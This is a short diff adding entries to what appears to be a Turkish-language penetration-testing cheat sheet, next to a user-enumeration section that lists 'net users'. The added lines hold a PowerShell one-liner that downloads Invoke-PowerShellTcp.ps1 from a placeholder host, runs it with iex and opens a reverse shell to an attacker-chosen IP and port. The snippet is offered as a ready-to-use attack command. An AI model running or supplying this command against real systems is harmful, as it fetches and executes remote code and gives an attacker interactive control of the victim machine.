@@ -1,3 +1,8 @@
+invoke powershell tcp
+
+iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>
+
+------------------------
 Kullanıcı Numaralandırma
 
 net users == kullanıcıları listeler
